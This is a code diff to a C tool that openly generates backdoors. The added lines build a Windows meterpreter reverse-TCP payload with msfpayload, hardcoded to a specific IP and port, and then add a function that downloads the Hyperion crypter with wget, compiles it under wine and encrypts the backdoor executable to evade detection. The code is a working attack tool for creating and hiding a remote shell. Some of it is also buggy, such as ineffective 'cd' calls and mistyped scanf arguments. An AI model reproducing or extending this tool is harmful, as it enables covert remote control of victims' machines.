@@ -87,9 +87,38 @@ void show_help(){
 	exit(1);
 	return ;
 }
+void creating_bin(){
+
+	return ;
+
+}
+void encrypt_his_shit(const char * name_of_bam){
+	/*
+
+		using Hyperion 
+
+	*/
+	//download the archive
+	system("wget http://nullsecurity.net/tools/binary/Hyperion-1.0.zip");
+	//unzip it
+	system("unzip Hyperion-1.0.zip");
+	//go to hyperion
+	system("cd Hyperion-1.0/");
+	//compiling hyperion
+	system("wine /root/.wine/drive_c/MinGW/bin/g++.exe ./Src/Crypter/*.cpp -o crypter.exe");
+	//encrypt
+	system("wine crypter.exe bam.exe encrypted_bam.exe");
+	message_done("Backdoor encrypted");
+
+	return ;
+
+}
 void start(){
-	const char * host, path, name;
+	const char * host;
+	const char * path;
+	const char * name;
 	int port;
+	char yb;
 	message_info("Starting ..");
 	//system("msfconsole");
 	//system("msf > show exploit");
@@ -107,9 +136,22 @@ void start(){
 	write();
 	scanf("%s",&path);
 	message_info("Creating...");
-	char long_cmd[200] = "msfpayload windows/meterpreter/reverse_tcp LHOST=YOUR IP LPORT=YOUR PORT x > path/name_of_file";
+	char long_cmd[200] = "msfpayload windows/meterpreter/reverse_tcp LHOST=10.188.70.74 LPORT=444 x > /home/naper/bam.exe";
 	system(long_cmd);
 	message_done("backdoor generated");
+	message_info("Would you like to creat a .bin file ?(y/n)");
+	write();
+	scanf(" %c",&yb);
+	if (yb == 'y')
+		creating_bin();
+	message_info("Would you like to encrypt the backdoor ?(y/n)");
+	write();
+	scanf(" %c",&yb);
+	if (yb == 'y')
+		encrypt_his_shit(name);
+
+
+
 	exit(1);
 	return ;
 }
